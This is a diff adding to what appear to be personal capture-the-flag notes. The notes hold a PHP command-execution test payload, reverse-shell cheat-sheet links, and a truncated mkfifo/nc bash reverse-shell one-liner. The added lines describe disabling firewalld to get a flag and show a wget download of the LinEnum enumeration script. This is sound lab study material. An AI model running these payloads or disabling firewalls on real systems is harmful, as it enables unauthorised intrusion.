@@ -36,3 +36,19 @@ PHP RCE test: ``` <?php system('id'); ?> ```
 RevShell CheatSheet: ``` https://swisskyrepo.github.io/InternalAllTheThings/cheats>
 ``` https://highon.coffee/blog/reverse-shell-cheat-sheet/ ```
  BASH REV SHELL '' Hawt ''  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc >
+
+
+#After Stream addendum: Got flag by disabling firewalld using sytemctl. 
+- Always consider that the firewall might be acting against you.
+``` cfsdexpo@CFSDTerm:~ » wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+--2026-01-04 06:52:02--  https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+Loaded CA certificate '/etc/ssl/certs/ca-certificates.crt'
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 2606:50c0:8002::154, 2606:50c0:8003::154, 2606:50c0:8000::154, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|2606:50c0:8002::154|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 46631 (46K) [text/plain]
+Saving to: ‘LinEnum.sh’
+
+LinEnum.sh            100%[======================>]  45.54K  --.-KB/s    in 0.01s   
+
+2026-01-04 06:52:03 (4.02 MB/s) - ‘LinEnum.sh’ saved [46631/46631] ```
